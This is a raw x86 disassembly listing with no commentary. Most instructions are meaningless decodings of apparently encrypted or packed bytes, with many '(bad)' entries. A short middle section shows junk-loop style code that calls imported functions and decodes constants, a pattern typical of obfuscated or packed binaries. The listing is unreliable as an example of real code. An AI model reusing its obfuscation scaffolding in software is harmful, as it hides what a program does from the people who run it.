  40d8ba:	mov    al,ds:0x9cd062bd
  40d8bf:	cmc    
  40d8c0:	cmp    DWORD PTR [edx+eiz*8],0x7
  40d8c4:	add    eax,0x6e1b7119
  40d8c9:	cs dec ebp
  40d8cb:	push   ecx
  40d8cc:	pop    ds
  40d8cd:	mov    ebp,0x15f00d83
  40d8d2:	scas   eax,DWORD PTR es:[edi]
  40d8d3:	inc    esi
  40d8d4:	(bad)  
  40d8d5:	aaa    
  40d8d6:	mov    ebp,0xbdb3f5ae
  40d8db:	jp     0x40d8e4
  40d8dd:	mov    ebp,DWORD PTR [eax+0x2a]
  40d8e0:	ror    DWORD PTR [ecx-0x440e0421],1
  40d8e6:	ss es add al,0x46
  40d8ea:	les    edi,FWORD PTR [edi]
  40d8ec:	jnp    0x40d872
  40d8ee:	push   0x48c14d7d
  40d8f3:	sub    cl,BYTE PTR [ecx+0x17]
  40d8f6:	dec    esp
  40d8f7:	lods   eax,DWORD PTR ds:[esi]
  40d8f8:	and    ebx,DWORD PTR [eax-0x60fb08ab]
  40d8fe:	xor    BYTE PTR [esi-0x21],0xcb
  40d902:	into   
  40d903:	pop    ebx
  40d904:	jns    0x40d8fb
  40d906:	aaa    
  40d907:	jmp    0x2098908
  40d90c:	mov    eax,ds:0x81c7f357
  40d911:	or     DWORD PTR [esi],edx
  40d913:	daa    
  40d914:	mov    al,0x9a
  40d916:	push   cs
  40d917:	das    
  40d918:	call   0x2212:0xb161f2e
  40d91f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d920:	and    DWORD PTR [ebx-0xab3509],eax
  40d926:	xchg   edx,eax
  40d927:	adc    dl,dh
  40d929:	test   edx,esi
  40d92b:	mov    ch,BYTE PTR [esi]
  40d92d:	ins    DWORD PTR es:[edi],dx
  40d92e:	loopne 0x40d902
  40d930:	scas   al,BYTE PTR es:[edi]
  40d931:	push   edx
  40d932:	loopne 0x40d925
  40d934:	test   eax,0x20a66fb6
  40d939:	pop    edx
  40d93a:	in     eax,dx
  40d93b:	sub    edi,DWORD PTR [eax]
  40d93d:	mov    ch,0xce
  40d93f:	pop    ebx
  40d940:	sar    DWORD PTR [ecx],0x11
  40d943:	cmp    DWORD PTR [edx+0x5304d241],edi
  40d949:	out    dx,eax
  40d94a:	adc    BYTE PTR [ebx+0x7c],bl
  40d94d:	pop    edi
  40d94e:	aam    0x5f
  40d950:	sub    al,0x20
  40d952:	xchg   esi,eax
  40d953:	push   edx
  40d954:	loopne 0x40d918
  40d956:	xor    BYTE PTR [edi],ch
  40d958:	jmp    0x232af262
  40d95d:	mov    dh,0xa0
  40d95f:	and    edx,esi
  40d961:	imul   esp,edi,0x8aa8a946
  40d967:	pushf  
  40d968:	aas    
  40d969:	and    ebp,eax
  40d96b:	aaa    
  40d96c:	or     BYTE PTR [edi+0x333da91],ah
  40d972:	jb     0x40d926
  40d974:	stos   DWORD PTR es:[edi],eax
  40d975:	test   eax,0xaedcf0cc
  40d97a:	cmp    ebx,DWORD PTR [edx-0x1c46056f]
  40d980:	lds    esp,FWORD PTR ds:0xb27b1c81
  40d986:	aas    
  40d987:	sub    dh,BYTE PTR [esi+0x2c8fe46b]
  40d98d:	outs   dx,BYTE PTR ds:[esi]
  40d98e:	loope  0x40d9c0
  40d990:	xor    esi,0x588dafba
  40d996:	pop    esp
  40d997:	mov    edi,0x3969433d
  40d99c:	xchg   edx,eax
  40d99d:	push   ss
  40d99e:	sub    ecx,DWORD PTR [edx]
  40d9a0:	int3   
  40d9a1:	aam    0x32
  40d9a3:	or     al,0x20
  40d9a5:	push   ecx
  40d9a6:	push   ds
  40d9a7:	fisubr WORD PTR [ecx-0x25]
  40d9aa:	(bad)  
  40d9ac:	in     al,dx
  40d9ad:	psrad  mm1,mm2
  40d9b0:	ss jmp 0x8526:0x20a034a5
  40d9b8:	jne    0x40da22
  40d9ba:	repz pop edx
  40d9bc:	cmp    BYTE PTR [ebx-0x5b],bl
  40d9bf:	out    dx,al
  40d9c0:	xchg   esp,eax
  40d9c1:	inc    ecx
  40d9c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d9c3:	fild   QWORD PTR [eax]
  40d9c5:	inc    edx
  40d9c6:	and    ecx,DWORD PTR [eax]
  40d9c8:	jne    0x40d9c9
  40d9ca:	add    BYTE PTR [esi+ebp*8+0x644b7806],ch
  40d9d1:	xchg   DWORD PTR [ebp+0x34],ebx
  40d9d4:	jno    0x40d9be
  40d9d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d9d7:	mov    edi,0x6ebde8b2
  40d9dc:	add    BYTE PTR ds:[esi+0x119ca115],bh
  40d9e3:	in     eax,0x1e
  40d9e5:	adc    al,0x4c
  40d9e7:	push   0xf4988892
  40d9ec:	cmp    ch,BYTE PTR [ebp+0x47]
  40d9ef:	js     0x40da56
  40d9f1:	out    dx,al
  40d9f2:	cwde   
  40d9f3:	pop    edi
  40d9f4:	and    al,BYTE PTR es:[ebp+0x5c]
  40d9f8:	call   0x7da09ed5
  40d9fd:	mov    BYTE PTR [edx-0x44],al
  40da00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da01:	(bad)  
  40da02:	aad    0x5e
  40da04:	daa    
  40da05:	inc    esp
  40da06:	or     eax,0xf9e0df35
  40da0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da0c:	cmp    BYTE PTR [esi-0x44],0x65
  40da10:	and    ebp,DWORD PTR [ecx-0xab8b2e9]
  40da16:	sub    eax,0xbab7d773
  40da1b:	push   ss
  40da1c:	mov    BYTE PTR [ebx],bl
  40da1e:	mov    bl,0xcc
  40da20:	xchg   esp,eax
  40da21:	sbb    eax,0x3eeffd80
  40da26:	fcomp  DWORD PTR [edi+0x4b]
  40da29:	mov    bh,al
  40da2b:	add    al,0xf7
  40da2d:	cmp    eax,0xcff81fde
  40da32:	mov    eax,ds:0x59b35d4e
  40da37:	mov    ah,0x61
  40da39:	(bad)  
  40da3a:	out    dx,eax
  40da3b:	jbe    0x40da3c
  40da3d:	mov    bh,0x61
  40da3f:	jmp    ebp
  40da41:	adc    edi,ebp
  40da43:	int3   
  40da44:	pop    ds
  40da45:	in     eax,dx
  40da46:	(bad)  
  40da48:	and    dl,ch
  40da4a:	cld    
  40da4b:	loop   0x40d9fb
  40da4d:	ja     0x40da4b
  40da4f:	pop    esp
  40da50:	je     0x40da78
  40da52:	push   ss
  40da53:	jmp    0x7f33eec7
  40da58:	test   ax,0xa50
  40da5c:	rcl    esi,cl
  40da5e:	or     ebx,ebx
  40da60:	div    BYTE PTR [eax+0x5]
  40da63:	pop    esi
  40da64:	out    dx,al
  40da65:	push   cs
  40da66:	lods   al,BYTE PTR ds:[esi]
  40da67:	jae    0x40dabd
  40da69:	push   esi
  40da6a:	shl    BYTE PTR gs:[eax-0x2268b994],cl
  40da71:	or     eax,0x4e4b5956
  40da76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da77:	cli    
  40da78:	frstor ds:0x56c80c12
  40da7e:	imul   DWORD PTR [edx]
  40da80:	(bad)  
  40da81:	fwait
  40da82:	mov    BYTE PTR [edi],dh
  40da84:	jmp    0x40da73
  40da86:	dec    edx
  40da87:	test   BYTE PTR [ecx],ch
  40da89:	out    0x86,al
  40da8b:	sbb    eax,0x176471ff
  40da90:	mov    ecx,0x8fdacaf2
  40da95:	sti    
  40da96:	jb     0x40da8c
  40da98:	std    
  40da99:	push   ds
  40da9a:	mov    cl,0x37
  40da9c:	or     BYTE PTR [eax+0x3002c15f],ah
  40daa2:	mov    al,0x66
  40daa4:	iret   
  40daa5:	sub    ebx,eax
  40daa7:	adc    dl,BYTE PTR [esi+0x19]
  40daaa:	and    DWORD PTR [edi+eiz*1],0x721fc661
  40dab1:	and    BYTE PTR [ebp+0x65],0x84
  40dab5:	je     0x40da57
  40dab7:	mov    gs,ebp
  40dab9:	mov    esp,0xfb974488
  40dabe:	ret    
  40dabf:	sbb    al,0xf1
  40dac1:	dec    DWORD PTR [esi]
  40dac3:	aad    0xbb
  40dac5:	or     ch,bl
  40dac7:	or     dh,ah
  40dac9:	es loopne 0x40db19
  40dacc:	lods   al,BYTE PTR ds:[esi]
  40dacd:	je     0x40daf5
  40dacf:	mov    bl,0x55
  40dad1:	loope  0x40db33
  40dad3:	sbb    DWORD PTR [ebp+0x58e5982c],eax
  40dad9:	aad    0xe3
  40dadb:	std    
  40dadc:	mov    esp,0xae317b86
  40dae1:	and    edi,DWORD PTR [ecx]
  40dae3:	test   DWORD PTR [ecx-0x58],ebp
  40dae6:	or     eax,DWORD PTR [ebx-0x1e]
  40dae9:	or     ebp,edi
  40daeb:	(bad)  
  40daec:	xchg   edi,eax
  40daed:	jle    0x40da91
  40daef:	mov    edx,0x12372bb6
  40daf4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40daf5:	retf   
  40daf6:	adc    eax,0xa5ee54be
  40dafb:	imul   BYTE PTR [ecx]
  40dafd:	imul   edi,esi,0xda06095
  40db03:	xchg   esi,eax
  40db04:	cmp    DWORD PTR [eax-0x6f],0x4f
  40db08:	out    0xdd,eax
  40db0a:	xor    esp,DWORD PTR [eax+0x5a]
  40db0d:	sub    BYTE PTR [edx],0x1a
  40db10:	dec    eax
  40db11:	inc    edi
  40db12:	sub    DWORD PTR [ebx],ebp
  40db14:	sbb    eax,0x5bc4f096
  40db19:	in     al,dx
  40db1a:	or     al,0xfa
  40db1c:	jns    0x40dad9
  40db1e:	push   esi
  40db1f:	cmp    BYTE PTR [edx+0x38],0x6
  40db23:	or     al,0x9d
  40db25:	jb     0x40daed
  40db27:	dec    edx
  40db28:	lea    esi,[eax]
  40db2a:	inc    esi
  40db2b:	adc    eax,0xe14b16eb
  40db30:	test   BYTE PTR [edi+ecx*2+0x5e],bh
  40db34:	in     al,dx
  40db35:	sub    al,ch
  40db37:	dec    esp
  40db38:	les    ebx,FWORD PTR [edx]
  40db3a:	or     ebp,DWORD PTR [esi+eiz*8-0x39d23753]
  40db41:	inc    esp
  40db42:	fimul  WORD PTR [eax+0x79bfbaff]
  40db48:	cmc    
  40db49:	and    eax,0xc61986c3
  40db4e:	aas    
  40db4f:	or     ch,cl
  40db51:	test   BYTE PTR [ebp-0x1f],ch
  40db54:	sub    eax,DWORD PTR [eax+edx*8+0x36]
  40db58:	fldenv [ecx-0x7805b672]
  40db5e:	xchg   dh,al
  40db60:	mov    ecx,0x384cacf9
  40db65:	dec    ebx
  40db66:	sub    esi,DWORD PTR [edx+0x1d]
  40db69:	in     eax,0xcf
  40db6b:	fidiv  DWORD PTR [eax]
  40db6d:	inc    ebp
  40db6e:	shr    BYTE PTR [ecx+0x4b],cl
  40db71:	sub    ah,BYTE PTR [ebx]
  40db73:	push   cs
  40db74:	shr    DWORD PTR [esi],0xa
  40db77:	cmp    al,0x5c
  40db79:	sub    eax,0xf23e0cdc
  40db7e:	jecxz  0x40dbdc
  40db80:	pop    eax
  40db81:	inc    ecx
  40db82:	mov    dh,0xaf
  40db84:	xor    bh,BYTE PTR [eax-0x32f83505]
  40db8a:	xor    DWORD PTR [esi+0x43],esi
  40db8d:	pop    ebp
  40db8e:	mov    WORD PTR [ecx+0x48d770c1],es
  40db94:	mov    ah,0x9c
  40db96:	in     al,0x31
  40db98:	pop    ecx
  40db99:	rcr    ecx,1
  40db9b:	xchg   ecx,eax
  40db9c:	mov    al,ds:0x523ad4b
  40dba1:	xchg   edx,eax
  40dba2:	in     eax,0x55
  40dba4:	mov    eax,ds:0x7d7b1d53
  40dba9:	xchg   dl,bh
  40dbab:	cdq    
  40dbac:	dec    esp
  40dbad:	mov    bl,0xfb
  40dbaf:	pop    ecx
  40dbb0:	pop    eax
  40dbb1:	push   ds
  40dbb2:	ins    DWORD PTR es:[edi],dx
  40dbb3:	pop    ds
  40dbb4:	mov    fs,WORD PTR [eax+0x62]
  40dbb7:	mov    al,0x6b
  40dbb9:	xchg   edx,eax
  40dbba:	fsubr  QWORD PTR [eax+0x4a]
  40dbbd:	out    0xae,al
  40dbbf:	dec    edi
  40dbc0:	sti    
  40dbc1:	xchg   ecx,eax
  40dbc2:	sub    bl,dh
  40dbc4:	sub    bl,al
  40dbc6:	pop    ebp
  40dbc7:	xor    bl,BYTE PTR [ecx]
  40dbc9:	cmp    DWORD PTR [ecx+0x4a],esi
  40dbcc:	sub    edi,DWORD PTR [esi]
  40dbce:	sub    DWORD PTR [ebp+edx*8-0x596e5900],ecx
  40dbd5:	push   0x8d6e0132
  40dbda:	mov    esp,ebx
  40dbdc:	ss ss dec esp
  40dbdf:	inc    edx
  40dbe0:	xor    al,0xcc
  40dbe2:	fwait
  40dbe3:	mov    bh,0x67
  40dbe5:	jg     0x40dbe4
  40dbe7:	xchg   esi,eax
  40dbe8:	mov    ecx,0x700b503c
  40dbed:	jle    0x40dbf3
  40dbef:	jbe    0x40db7b
  40dbf1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dbf2:	pushf  
  40dbf3:	out    0xdc,eax
  40dbf5:	mov    ah,0xc5
  40dbf7:	inc    ebx
  40dbf8:	jmp    0x58c2888f
  40dbfd:	test   BYTE PTR [ebx+0x411d0fd3],0x45
  40dc04:	call   DWORD PTR [ecx]
  40dc06:	jbe    0x40dc0d
  40dc08:	push   edx
  40dc09:	in     al,dx
  40dc0a:	ret    
  40dc0b:	pop    esp
  40dc0c:	sar    dl,1
  40dc0e:	xor    al,0x72
  40dc10:	xchg   ecx,eax
  40dc11:	jno    0x40dc3b
  40dc13:	loope  0x40dc5b
  40dc15:	jecxz  0x40dbe3
  40dc17:	mov    esp,0xa950db1e
  40dc1c:	shl    DWORD PTR [eax+0x66],0x7c
  40dc20:	lds    dx,DWORD PTR [eax]
  40dc23:	out    dx,eax
  40dc24:	mov    es,WORD PTR [ebp+0x34ebadf0]
  40dc2a:	je     0x40dbb8
  40dc2c:	and    al,0xa4
  40dc2e:	cmp    eax,0xfc50644d
  40dc33:	int3   
  40dc34:	ror    DWORD PTR [eax-0x54],1
  40dc37:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc39:	xor    ebx,0xffffffed
  40dc3c:	test   al,0x9a
  40dc3e:	push   ebx
  40dc3f:	inc    edx
  40dc40:	std    
  40dc41:	and    edx,DWORD PTR [edx]
  40dc43:	cmp    BYTE PTR ds:0x96932035,cl
  40dc49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc4a:	lahf   
  40dc4b:	stos   BYTE PTR es:[edi],al
  40dc4c:	and    dh,bl
  40dc4e:	shl    BYTE PTR [esi+eax*4+0x47],1
  40dc52:	or     BYTE PTR [edx+0x44],bl
  40dc55:	push   ss
  40dc56:	jmp    0x40dc5a
  40dc58:	sysenter 
  40dc5a:	inc    esp
  40dc5b:	add    BYTE PTR [edi-0x52],bl
  40dc5e:	xchg   esi,eax
  40dc5f:	out    dx,eax
  40dc60:	in     al,dx
  40dc61:	xchg   esi,eax
  40dc62:	bound  esi,QWORD PTR [ebx+0x76]
  40dc65:	mov    cl,0x80
  40dc67:	lods   eax,DWORD PTR ds:[esi]
  40dc68:	lock inc ecx
  40dc6a:	cld    
  40dc6b:	jge    0x40dcc3
  40dc6d:	adc    cl,BYTE PTR ss:[esi-0x3f]
  40dc71:	mov    es,esi
  40dc73:	mov    esi,0xe450366e
  40dc78:	jno    0x40dccf
  40dc7a:	ja     0x40dccd
  40dc7c:	pusha  
  40dc7d:	xchg   DWORD PTR [ecx+0x55796b27],ecx
  40dc83:	xchg   ebp,eax
  40dc84:	xchg   edx,eax
  40dc85:	je     0x40dca0
  40dc87:	fldl2e 
  40dc89:	adc    eax,0x8d37d7f6
  40dc8e:	mov    bl,0x25
  40dc90:	push   es
  40dc91:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  40dc93:	leave  
  40dc94:	cmc    
  40dc95:	ss jne 0x40dcee
  40dc98:	and    al,dh
  40dc9a:	pusha  
  40dc9b:	mov    ds:0x3e733d7c,eax
  40dca0:	pop    esi
  40dca1:	inc    ebp
  40dca2:	dec    edx
  40dca3:	push   0x9fd0e0a3
  40dca8:	ja     0x40dc9c
  40dcaa:	and    ch,BYTE PTR [edi]
  40dcac:	fidivr DWORD PTR ds:0x6b08c0be
  40dcb2:	push   eax
  40dcb3:	sbb    al,0x32
  40dcb5:	les    ebx,FWORD PTR [eax]
  40dcb7:	add    ecx,DWORD PTR [edx]
  40dcb9:	xor    DWORD PTR [eax-0x49],esi
  40dcbc:	rol    ebp,cl
  40dcbe:	sub    esp,DWORD PTR [edx-0x601ce30a]
  40dcc4:	adc    edx,DWORD PTR [edi+ebx*8-0x3d]
  40dcc8:	pop    ss
  40dcc9:	das    
  40dcca:	repnz cdq 
  40dccc:	or     eax,0x13531367
  40dcd1:	sub    eax,0x800eabcb
  40dcd6:	in     al,dx
  40dcd7:	cs add eax,0x645ff0cb
  40dcdd:	mov    al,0xb6
  40dcdf:	jl     0x40dc6b
  40dce1:	xor    dl,BYTE PTR [ecx+0x7c]
  40dce4:	mov    dl,dl
  40dce6:	test   DWORD PTR [edx+0x60],ecx
  40dce9:	or     edx,DWORD PTR [eax]
  40dceb:	jg     0x40dc91
  40dced:	pop    edi
  40dcee:	mov    al,ds:0xc6dd6b9c
  40dcf3:	out    dx,al
  40dcf4:	sar    BYTE PTR [eax+ebx*1-0x4b],0x1a
  40dcf9:	hlt    
  40dcfa:	mov    bh,al
  40dcfc:	scas   eax,DWORD PTR es:[edi]
  40dcfd:	and    BYTE PTR [esi+0x11],bl
  40dd00:	mov    ebx,0x655e0429
  40dd05:	push   cs
  40dd06:	sbb    ch,BYTE PTR [edx]
  40dd08:	(bad)
  40dd0c:	imul   edx,DWORD PTR [ebp+eiz*1+0xb],0x36
  40dd11:	mov    ebp,0x92fd7f73
  40dd16:	xchg   edi,eax
  40dd17:	cmp    ch,BYTE PTR [ebx+0x581ce33]
  40dd1d:	sbb    BYTE PTR [eax-0x5fffffbe],ah
  40dd23:	inc    edx
  40dd24:	add    BYTE PTR [ecx-0x30fc33bb],cl
  40dd2a:	jmp    0x4191e1
  40dd2f:	sub    DWORD PTR ds:0x42a018,edi
  40dd35:	lea    edx,[ecx+eax*1]
  40dd38:	mov    DWORD PTR [ebp-0x28],edx
  40dd3b:	mov    edx,DWORD PTR [ebp-0x44]
  40dd3e:	mov    ebx,DWORD PTR ds:0x429004
  40dd44:	add    DWORD PTR ds:0x42c008,ebx
  40dd4a:	sub    edx,ecx
  40dd4c:	mov    DWORD PTR ds:0x42b004,0x1e
  40dd56:	cmp    DWORD PTR ds:0x42b004,0x0
  40dd5d:	je     0x40dd97
  40dd63:	cmp    DWORD PTR ds:0x42b004,0x28
  40dd6a:	jne    0x40dd85
  40dd70:	push   0x3a6a
  40dd75:	push   0x42b010
  40dd7a:	push   0x4236ae
  40dd7f:	call   DWORD PTR ds:0x424048
  40dd85:	mov    ebx,DWORD PTR ds:0x42b004
  40dd8b:	dec    ebx
  40dd8c:	mov    DWORD PTR ds:0x42b004,ebx
  40dd92:	jmp    0x40dd56
  40dd97:	mov    DWORD PTR [ebp-0x24],edx
  40dd9a:	mov    edx,DWORD PTR [ebp-0x24]
  40dd9d:	and    DWORD PTR ds:0x428008,edi
  40dda3:	mov    DWORD PTR [ebp-0x14],edx
  40dda6:	not    edx
  40dda8:	mov    edx,DWORD PTR [ebp-0x28]
  40ddab:	mov    DWORD PTR ds:0x42800c,0x11
  40ddb5:	cmp    DWORD PTR ds:0x42800c,0x0
  40ddbc:	je     0x40de6b
  40ddc2:	cmp    DWORD PTR ds:0x42800c,0x8
  40ddc9:	jne    0x40dddd
  40ddcf:	push   0x42a010
  40ddd4:	push   DWORD PTR [ebp-0x28]
  40ddd7:	call   DWORD PTR ds:0x424014
  40dddd:	cmp    DWORD PTR ds:0x42800c,0x9
  40dde4:	jne    0x40ddf7
  40ddea:	mov    ebx,DWORD PTR ds:0x42800c
  40ddf0:	dec    ebx
  40ddf1:	mov    DWORD PTR ds:0x42800c,ebx
  40ddf7:	xor    ebx,ebx
  40ddf9:	or     ebx,DWORD PTR ds:0x42800c
  40ddff:	dec    ebx
  40de00:	mov    DWORD PTR ds:0x42800c,ebx
  40de06:	jmp    0x40ddb5
  40de0b:	mov    DWORD PTR ds:0x429004,0x17
  40de15:	cmp    DWORD PTR ds:0x429004,0x0
  40de1c:	je     0x40de6b
  40de22:	cmp    DWORD PTR ds:0x429004,0x25
  40de29:	jne    0x40de57
  40de2f:	push   0x85b6
  40de34:	push   0x42a018
  40de39:	push   DWORD PTR [ebp-0x24]
  40de3c:	push   0x42c000
  40de41:	push   0x5138
  40de46:	push   DWORD PTR [ebp-0x24]
  40de49:	push   0x4b55
  40de4e:	push   DWORD PTR [ebp-0x24]
  40de51:	call   DWORD PTR ds:0x424018
  40de57:	xor    ebx,ebx
  40de59:	add    ebx,DWORD PTR ds:0x429004
  40de5f:	dec    ebx
  40de60:	mov    DWORD PTR ds:0x429004,ebx
  40de66:	jmp    0x40de15
  40de6b:	mov    DWORD PTR [ebp-0x3c],0xf89c85b6
  40de72:	mov    DWORD PTR [ebp-0x40],edx
  40de75:	mov    DWORD PTR [ebp-0x18],0xf89c85b5
  40de7c:	mov    edx,DWORD PTR [ebp-0x3c]
  40de7f:	xor    edx,esi
  40de81:	add    edx,edi
  40de83:	mov    DWORD PTR [ebp-0x10],edx
  40de86:	mov    edx,DWORD PTR [ebp-0x3c]
  40de89:	xor    edx,esi
  40de8b:	add    edx,edi
  40de8d:	mov    DWORD PTR [ebp-0x8],edx
  40de90:	mov    DWORD PTR [ebp-0x28],0xf89c85d6
  40de97:	mov    DWORD PTR [ebp-0x2c],0xf89c85bf
  40de9e:	mov    edx,DWORD PTR [ebp-0x3c]
  40dea1:	mov    ebx,DWORD PTR [ebp-0x14]
  40dea4:	xor    edx,esi
  40dea6:	add    edx,edi
  40dea8:	cmp    ebx,edx
  40deaa:	je     0x4191d5
  40deb0:	mov    eax,DWORD PTR [ebp-0x18]
  40deb3:	xor    eax,esi
  40deb5:	mov    edx,0xffcd8d25
  40deba:	sub    edx,eax
  40debc:	add    edx,DWORD PTR [ebp-0x14]
  40debf:	mov    eax,DWORD PTR [ebp-0x18]
  40dec2:	mov    ebx,DWORD PTR [ebp-0x10]
  40dec5:	xor    eax,esi
  40dec7:	jmp    0x41023c
  40decc:	and    ecx,DWORD PTR [eax+0x3]
  40decf:	scas   eax,DWORD PTR es:[edi]
  40ded0:	jecxz  0x40df3d
  40ded2:	arpl   sp,ax
  40ded4:	jns    0x40de7a
  40ded6:	cmp    edi,edi
  40ded8:	(bad)  
  40deda:	ret    
  40dedb:	xchg   BYTE PTR [edi],dl
  40dedd:	shl    DWORD PTR [edx+0x62],1
  40dee0:	or     bl,BYTE PTR [edi+0x62]
  40dee3:	bound  esp,QWORD PTR [ebp-0x39a0841d]
  40dee9:	repnz add ch,BYTE PTR [ecx]
  40deec:	in     eax,0xe0
  40deee:	or     al,0x3d
  40def0:	and    al,ch
  40def2:	icebp  
  40def3:	mov    al,0xc2
  40def5:	mov    fs,WORD PTR [ebx+0x71e9bb61]
  40defb:	mov    al,0x2c
  40defd:	loope  0x40df14
  40deff:	mov    ds:0x3ad92a6c,eax
  40df04:	retf   0x3b2
  40df07:	(bad)  
  40df09:	and    BYTE PTR [eax],0xf2
  40df0c:	scas   al,BYTE PTR es:[edi]
  40df0d:	test   al,0x5c
  40df0f:	cs adc eax,0x76aff946
  40df15:	daa    
  40df16:	or     bl,BYTE PTR [eax-0x9]
  40df19:	xchg   ebp,eax
  40df1a:	imul   edx,DWORD PTR [ebp-0x4a],0xffffff94
  40df1e:	inc    ebp
  40df1f:	jle    0x40df24
  40df21:	ja     0x40df4c
  40df23:	jge    0x40df84
  40df25:	pop    es
  40df26:	pop    ds
  40df27:	pop    ds
  40df28:	push   cs
  40df29:	dec    ebx
  40df2a:	cmp    al,0x1d
  40df2c:	mov    cl,bh
  40df2e:	imul   edi,DWORD PTR gs:[eiz*2+0x19a5d53b],0xb2adf8cd
  40df3a:	aam    0x7c
  40df3c:	pop    ebx
  40df3d:	shr    DWORD PTR [ecx],cl
  40df3f:	fadd   DWORD PTR [ecx-0x6f2c460e]
  40df45:	add    esi,DWORD PTR ss:[edi]
  40df48:	jne    0x40dfc9
  40df4a:	jo     0x40df34
  40df4c:	push   cs
  40df4d:	sbb    BYTE PTR [esi],bl
  40df4f:	mov    edi,0xb7b34d7a
  40df54:	retf   
  40df55:	loopne 0x40dfb8
  40df57:	pop    ss
  40df58:	add    eax,0xd23702f6
  40df5d:	and    edi,DWORD PTR [ebx+0x3ce9f929]
  40df63:	xchg   edi,eax
  40df64:	scas   al,BYTE PTR es:[edi]
  40df65:	stos   DWORD PTR es:[edi],eax
  40df66:	out    0x65,al
  40df68:	and    DWORD PTR [esi+eiz*8-0x4],edi
  40df6c:	int    0x88
  40df6e:	stos   DWORD PTR es:[edi],eax
  40df6f:	sahf   
  40df70:	addr16 mov eax,0x81614415
  40df76:	jle    0x40df76
  40df78:	add    eax,0x9113969a
  40df7d:	and    dl,BYTE PTR [eax-0xb00a4fc]
  40df83:	inc    eax
  40df84:	xchg   ecx,eax
  40df85:	sub    eax,0x59ec5cac
  40df8a:	mov    bh,0x82
  40df8c:	push   ss
  40df8d:	scas   al,BYTE PTR es:[edi]
  40df8e:	test   eax,0x7c3380a4
  40df93:	mov    bh,0x85
  40df95:	push   ecx
  40df96:	fs js  0x40df44
  40df99:	or     bh,0x8e
  40df9c:	out    dx,al
  40df9d:	cld    
  40df9e:	fisttp QWORD PTR [eax-0x7]
  40dfa1:	push   ds
  40dfa2:	repz addr16 sub al,0x50
  40dfa6:	xchg   edi,eax
  40dfa7:	out    dx,eax
  40dfa8:	pop    ebx
  40dfa9:	adc    al,0xcc
  40dfab:	jmp    0xf1cd9e13
  40dfb0:	adc    esp,ebp
  40dfb2:	and    DWORD PTR ds:[esi],esi
  40dfb5:	adc    eax,0xe7175abe
  40dfba:	nop
  40dfbb:	xor    al,0x74
  40dfbd:	adc    DWORD PTR [eax-0x12ea5046],eax
  40dfc3:	enter  0x40ea,0x14
  40dfc7:	ds inc eax
  40dfc9:	or     DWORD PTR [ebp+ebx*8-0x53b8e662],eax
  40dfd0:	pop    esi
  40dfd1:	pop    ebx
  40dfd2:	pop    ecx
  40dfd3:	enter  0x7b7f,0x2e
  40dfd7:	imul   ecx,DWORD PTR [ecx+0x5a],0xffffff9a
  40dfdb:	leave  
  40dfdc:	xchg   BYTE PTR [eax],ah
  40dfde:	add    DWORD PTR [edx-0x5d999d2c],0xe85cc1a8
  40dfe8:	push   es
  40dfe9:	pop    eax
  40dfea:	pop    ss
  40dfeb:	jnp    0x40df6d
  40dfed:	or     DWORD PTR [esi+0x186c9a5b],esi
  40dff3:	fld    QWORD PTR [ebx]
  40dff5:	cli    
  40dff6:	sub    ebp,DWORD PTR [ebp+0x16]
  40dff9:	mov    ebp,0xfad04daa
  40dffe:	pop    es
  40dfff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e000:	retw   
  40e002:	dec    ecx
  40e003:	fsub   QWORD PTR [ebp-0x53]
  40e006:	(bad)  
  40e007:	add    DWORD PTR [ebp-0x56],edi
  40e00a:	pop    esp
  40e00b:	imul   edx,DWORD PTR [ecx-0x5d],0x8c847215
  40e012:	mov    ch,0xc4
  40e014:	fidiv  DWORD PTR [ebx+eax*2+0x74]
  40e018:	fisubr WORD PTR [eax-0x401a4751]
  40e01e:	clc    
  40e01f:	lahf   
  40e020:	loope  0x40e047
  40e022:	push   edx
  40e023:	enter  0x7e1a,0x6b
  40e027:	adc    BYTE PTR [edx+0x2a],ch
  40e02a:	out    dx,al
  40e02b:	dec    ebp
  40e02c:	jl     0x40e09f
  40e02e:	pop    ebx
  40e02f:	mov    eax,0x5279b9ea
  40e034:	dec    esi
  40e035:	retf   
  40e036:	add    ch,dh
  40e038:	imul   esp,DWORD PTR [ecx+0x59],0xffffffa3
  40e03c:	fcmovu st,st(6)
  40e03e:	daa    
  40e03f:	dec    edi
  40e040:	out    0x3c,eax
  40e042:	sbb    DWORD PTR [ebx+0x5e593aea],edi
  40e048:	pushf  
  40e049:	imul   DWORD PTR [eax+ebp*8+0x58c9f471]
  40e050:	adc    DWORD PTR [edx+0x7f],ebx
  40e053:	loope  0x40e071
  40e055:	jno    0x40e05d
  40e057:	fld    QWORD PTR [eax+0x67]
  40e05a:	jb     0x40e01d
  40e05c:	xchg   esi,eax
  40e05d:	or     al,0xae
  40e05f:	in     eax,0x23
  40e061:	inc    eax
  40e062:	sahf   
  40e063:	arpl   di,sp
  40e065:	popa   
  40e066:	push   ebx
  40e067:	cmp    edi,esp
  40e069:	clc    
  40e06a:	jae    0x40e09c
  40e06c:	push   edi
  40e06d:	inc    esi
  40e06e:	jbe    0x40e076
  40e070:	or     BYTE PTR [ecx-0x6f6ad659],ah
  40e076:	and    al,0x7e
  40e078:	or     edi,ebx
  40e07a:	xchg   eax,ebp
  40e07c:	pop    ebp
  40e07d:	inc    ebp
  40e07e:	xor    bh,BYTE PTR [eax+esi*4]
  40e081:	push   es
  40e082:	pop    ecx
  40e083:	inc    ebp
  40e084:	xchg   edi,eax
  40e085:	clc    
  40e086:	shl    DWORD PTR [ebp+0x1a],0x78
  40e08a:	stos   BYTE PTR es:[edi],al
  40e08b:	mov    al,ds:0x591f6f33
  40e090:	daa    
  40e091:	bound  ebx,QWORD PTR [ecx]
  40e093:	mov    edx,0xf8245142
  40e098:	push   edx
  40e099:	shr    BYTE PTR [ebx-0x2a7c3d03],1
  40e09f:	stos   DWORD PTR es:[edi],eax
